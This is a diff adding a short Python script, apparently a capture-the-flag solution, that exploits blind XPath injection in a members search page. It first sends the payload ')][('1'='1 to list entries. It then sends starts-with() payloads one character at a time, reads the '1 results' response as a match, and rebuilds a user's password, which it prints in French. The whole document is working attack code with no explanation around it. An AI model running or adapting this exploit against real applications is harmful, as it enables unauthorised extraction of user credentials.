@@ -1,0 +1,30 @@
+import requests
+
+page = "http:///?action=members&search="
+cooki = {}
+
+charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+passwd = ""
+
+req = page+"')][('1'='1"
+res = requests.get(req,cookies=cooki)
+for x in res.text.split("<li>"):print(x)
+
+continuer=True
+for t in range(0,50):
+    if continuer:
+        continuer=False
+        for carac in charset:
+            req=page+"Harry') and starts-with(../password,'"+passwd+carac
+                        #print req
+            res = requests.get(req, cookies=cooki)
+                        #print " rep= "+res.text.split("value=")[3]+"\n-----------\n"
+
+            if "1 results" in res.text:
+                passwd+=carac
+                continuer=True
+                print(passwd)
+                break
+    else:
+        print("Le mot de passe est : "+passwd)
+        break
